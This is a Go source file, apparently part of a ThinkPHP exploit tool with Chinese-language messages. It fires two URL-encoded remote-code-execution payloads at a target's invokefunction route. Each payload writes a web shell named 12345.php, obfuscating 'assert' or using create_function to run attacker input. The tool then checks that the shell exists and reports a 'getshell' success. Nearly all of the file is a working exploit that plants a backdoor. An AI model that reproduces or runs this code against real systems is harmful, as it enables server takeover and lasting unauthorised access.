package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

var payloads4 []string

func bybass(baseurl string)  {
	flag := bybass1(baseurl) //接受返回的payload
	if  flag != "0"{
		fmt.Println("\n"+baseurl," [+] vul ! ! !getshell: url+12345.php\npayload: ",flag+"\n")
	} else {
		fmt.Println(baseurl," [-] by pass fail ")
	}
}

func bybass1(baseurl string) string  {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	payloads4 := append(payloads4,
		"/?s=index/think%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=12345.php&vars%5B1%5D%5B1%5D=%3C?php%20echo%20'vul';%20$poc%20=%22axsxsxexrxt%22;$poc_1%20=%20explode(%22x%22,%20$poc);$poc_2%20=%20$poc_1%5B0%5D%20.%20$poc_1%5B1%5D%20.%20$poc_1%5B2%5D%20.%20$poc_1%5B3%5D.%20$poc_1%5B4%5D.%20$poc_1%5B5%5D;$poc_2(urldecode(urldecode(urldecode($_REQUEST%5B'12345'%5D))));?%3E",
		"/?s=index/think%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=12345.php&vars%5B1%5D%5B1%5D=%3C?php%20echo%20'vul';%20$fun%20=%20create_function('',urldecode(urldecode(urldecode($_REQUEST%5Bwww%5D))));$fun();?%3E")
	for _, payload := range payloads4{
		flag := bybass2(baseurl, payload)
		if flag != "0"{
			return flag
		}
		url := baseurl + "/public/index.php"+payload
		client := http.Client{
			Transport:     tr,
			CheckRedirect: nil,
			Jar:           nil,
			Timeout:       time.Second*5,
		}
		req, err := http.NewRequest("GET",url,nil)
		if err != nil {
			return "0"
		}
		req.Header.Set("User-Agent",user_agent)
		_, err = client.Do(req)
		if err != nil {
			fmt.Println("[-] 请求超时，请检查url！ x.x")
			return "0"
		}
		resp, err := http.Get(baseurl+"/public/12345.php")
		if err != nil {
			return "0"
		}
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			return "0"
		}
		if (strings.Contains(string(body),"vul")){
			return payload
		} else {
			return "0"
		}
	}
	return "0"
}

func bybass2(baseurl string,payload string) string {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	url := baseurl + payload
	client := http.Client{
		Transport:     tr,
		CheckRedirect: nil,
		Jar:           nil,
		Timeout:       time.Second*5,
	}
	req, err := http.NewRequest("GET",url,nil)
	if err != nil {
		return "0"
	}
	req.Header.Set("User-Agent",user_agent)
	_, err = client.Do(req)
	if err != nil {
		fmt.Println("[-] 请求超时，请检查url！ x.x")
		return "0"
	}
	resp, err := http.Get(baseurl+"/12345.php")
	if err != nil {
		return "0"
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "0"
	}
	if (strings.Contains(string(body),"vul")){
		return payload
	} else {
		return "0"
	}
}
